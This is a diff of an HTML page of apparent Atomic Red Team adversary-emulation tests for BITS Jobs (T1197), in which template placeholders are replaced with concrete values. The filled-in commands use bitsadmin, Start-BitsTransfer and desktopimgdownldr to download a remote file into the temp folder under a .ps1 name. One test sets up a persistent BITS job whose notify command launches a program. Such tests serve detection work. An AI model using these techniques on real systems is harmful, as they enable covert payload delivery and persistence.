@@ -806,7 +806,7 @@ and execute a payload</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -826,7 +826,7 @@ and execute a payload leveraging PowerShell</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Start-BitsTransfer</span> <span class="n">-Priority</span> <span class="n">foreground</span> <span class="n">-Source</span> <span class="c">#{remote_file} -Destination #{local_file}</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -845,12 +845,12 @@ and execute a payload in multiple steps. This job will remain in the BITS queue 
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>bitsadmin.exe /create #{bits_job_name}
-bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} &quot;&quot;
-bitsadmin.exe /resume #{bits_job_name}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>bitsadmin.exe /create AtomicBITS
+bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1
+bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe &quot;&quot;
+bitsadmin.exe /resume AtomicBITS
 timeout 5
-bitsadmin.exe /complete #{bits_job_name}
+bitsadmin.exe /complete AtomicBITS
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -871,7 +871,7 @@ and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windo
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>set &quot;#{download_path}&quot; &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>set &quot;SYSTEMROOT=C:\Windows\Temp&quot; &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
 </pre></div>
 </div>
 <div class="cell docutils container">
